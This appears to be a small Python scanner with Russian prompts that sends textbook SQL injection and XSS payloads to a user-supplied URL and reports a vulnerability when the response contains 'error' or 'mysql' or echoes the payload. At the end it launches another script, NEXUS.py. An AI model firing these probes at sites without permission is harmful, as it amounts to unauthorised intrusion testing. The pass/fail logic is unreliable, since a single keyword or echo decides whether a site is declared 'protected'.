import time
import requests
import os
import colorama
from colorama import Fore


colorama.init()

headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.3'}




print (Fore.YELLOW + "")

#script





def gp():
    print (Fore.GREEN + '')
    
    target_url = input("Введите URL сайта для проверки: ")
    
    payloads_sql = ["' OR '1'='1", '" OR "1"="1']
    
    payloads_xss = ["<script>alert('XSS')</script>", "'><img src=x onerror=alert(1)>"]
    
    for payload in payloads_sql:
        response = requests.get(f"{target_url}?id={payload}")
        if "error" in response.text.lower() or "mysql" in response.text.lower():
            print (Fore.RED + '')
            print(f"SQL-инъекция найдена: {response.url}")
        else:
            print (Fore.YELLOW + '')
            print ('SQL не найден! +++ Сайт защищён!')
  #  time.sleep(62)

    for payload in payloads_xss:
        response = requests.get(f"{target_url}?search={payload}")
        if payload in response.text:
            print (Fore.RED + '')
            print(f"XSS уязвимость найдена: {response.url}")
        else:
            print (Fore.YELLOW + '')
            print ('XSS не найден! +++Сайт защищён!')
   # time.sleep(62)



gp()


print ("")
i = input("Нажмите Enter")
#f = open("bs.txt",  "r")
os.system("clear")
os.system("python3 NEXUS.py")



#ok
